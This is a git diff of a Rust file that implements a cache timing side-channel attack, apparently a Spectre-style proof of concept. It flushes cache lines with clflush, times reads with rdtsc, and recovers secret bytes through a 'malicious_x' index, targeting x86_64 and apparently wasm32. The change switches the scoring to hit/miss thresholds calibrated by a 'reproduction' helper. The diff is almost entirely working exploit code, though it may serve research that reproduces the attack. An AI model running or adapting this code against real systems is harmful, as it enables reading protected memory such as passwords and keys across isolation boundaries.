@@ -1,5 +1,6 @@
 #![feature(asm_experimental_arch)]
 
+use reproduction::*;
 use std::arch::asm;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_clflush;
@@ -23,15 +24,6 @@ extern "C" {
     // fn sync_in_sibling()
 }
 
-// TODO, remove the tming based, use the 3/4 of the avg and the best,second best strategy, it is
-// more resilient
-// in Wasm it is larger !
-// TODO, make a mean based measurement instead of tming threshold.
-/*#[cfg(all(target_arch = "x86_64"))]
-const THRESHOLD: u64 = 80;
-#[cfg(all(target_arch = "wasm32"))]
-const THRESHOLD: u64 = 470;
-*/
 const STRIDE: usize = 512;
 
 const data_size: usize = 11;
@@ -44,45 +36,10 @@ const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
 // To avoid optimization of the victim code
 static mut tmp: u8 = 0;
 
-#[cfg(all(target_arch = "x86_64"))]
-fn read_memory_offset(ptr: *const u8) -> u8 {
-    let result: u8 = 0;
-    unsafe {
-        asm!(
-            "mov {result}, [{x}]",
-            x = in(reg) ptr,
-            result = out(reg_byte) _
-        );
-    };
-    result
-}
-
-#[cfg(all(target_arch = "wasm32"))]
-#[no_mangle]
-fn read_memory_offset(ptr: *const u8) -> u8 {
-    let mut result = 0u8;
-    //println!("Reading from memory");
-    unsafe {
-        asm!(
-            // Push the ptr in the stack
-            "local.get {}",
-            "i32.load8_u 0",
-            //"i32.load8_u",
-            "local.set {}",
-            in(local) ptr,
-            lateout(local) result,
-            //result = out(reg_byte) _
-            options(nostack),
-
-        );
-    };
-    result
-}
-
 // Returns the best two indexes and the best two values
 #[no_mangle]
 #[allow(dead_code)]
-fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
+fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64; 2]) {
     let mut latencies = [0; 256];
     let mut scores = [0u64; 256];
 
@@ -101,16 +58,9 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
         eprint!("latencies = [")
     }*/
     // Get the TRIES from env
-    let tries = std::env::var("TRIES").unwrap_or("60000".to_string());
+    let tries = std::env::var("TRIES").unwrap_or("20000".to_string());
     let tries = tries.parse::<u64>().unwrap();
     for i in 0..tries {
-        /*#[cfg(feature = "tracing")]
-        {
-            eprint!("[");
-        }*/
-        for i in 0..256 {
-            // latencies[i] = 0;
-        }
         // flush lines clflush
         // PRIME
         for j in 0..256 {
@@ -147,19 +97,11 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
                 tmp &= read_memory_offset(addr);
                 _rdtsc() - start
             };
-            latencies[mix_i] += end;
-        }
-
-        let mut sum = 0;
-        for l in latencies {
-            sum += l;
-        }
-        //let avg = sum / 256;
-        for (i, l) in latencies.iter().enumerate() {
-            if 255 * l < 3 * sum / 4 {
-                scores[i] += 1;
+            if end <= (90 * hit + 10 * miss) / 100 {
+                scores[mix_i] += 1;
             }
         }
+
         for j in 0..256 {
             // Get the best and the second best
             if max1 < 0 || scores[j] >= scores[max1 as usize] {
@@ -215,8 +157,11 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
 
 #[no_mangle]
 pub fn predict(pad: usize) {
+    let (hit, miss) = reproduction::get_cache_time(&array_for_prediction);
+
+    println!("Hit: {}, Miss: {}", hit, miss);
     for j in 0..11 {
-        let (score, value) = read_memory_byte(j + pad);
+        let (score, value) = read_memory_byte(j + pad, hit, miss);
         // get value 0 as char
         let ch = value[0] as u8 as char;
         let ch2 = value[1] as u8 as char;
@@ -230,13 +175,6 @@ pub fn predict(pad: usize) {
 
         #[cfg(not(feature = "tracing"))]
         print!("{}", ch);
-        // PRIME
-        for j in 0..256 {
-            unsafe {
-                _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
-            }
-        }
-        //break;
     }
 }
 
